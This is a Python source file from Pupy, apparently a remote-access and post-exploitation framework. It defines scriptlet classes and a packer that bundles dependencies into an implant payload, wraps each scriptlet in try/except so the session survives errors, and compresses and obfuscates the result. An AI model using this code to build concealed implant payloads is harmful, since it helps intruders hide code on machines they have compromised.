#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import os, os.path, cPickle
from pupylib.payloads.python_packer import gen_package_pickled_dic, wrap_try_except
from pupylib.utils.obfuscate import compress_encode_obfs

class ScriptletArgumentError(Exception):
	pass

class Scriptlet(object):
	""" Default pupy scriptlet. This description needs to be overriden to describe the scriptlet """
	dependencies=[]
	arguments={}
	def generate(self, *args, **kwargs):
		""" this method is meant to be overriden """
		raise NotImplementedError()

	@classmethod
	def print_help(cls):
		print "-"*15
		print("\t description: %s"%cls.__doc__)
		if cls.arguments:
			print("\t arguments: ")
			for arg, desc in cls.arguments.iteritems():
				print("\t\t - %s : %s"%(arg, desc))
		else:
			print("\t arguments: this scriptlet does not take any argument")
		print "-"*15

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..","packages"))

class ScriptletsPacker(object):
	def __init__(self, debug=False):
		self.scriptlets=[]
		self.debug=debug
	def add_scriptlet(self, sl):
		self.scriptlets.append(sl)
	def pack(self):
		fullpayload=[]
		fullpayload.append("import pupyimporter")
		all_packages=[]
		for sl in self.scriptlets:
			all_packages.extend(sl.dependencies)
		all_packages=list(set(all_packages))
		for p,n in all_packages:
			modules_dic=gen_package_pickled_dic(os.path.join(ROOT, p.replace("/",os.sep)), n)
			fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
		for sl in self.scriptlets:
			if self.debug:
				fullpayload.append(sl.generate())
			else: 
				#if not in debug mode, catch all exception to continue an have a session if a scriptlet raises an exception
				fullpayload.append(wrap_try_except(sl.generate()))
		return compress_encode_obfs('\n'.join(fullpayload))


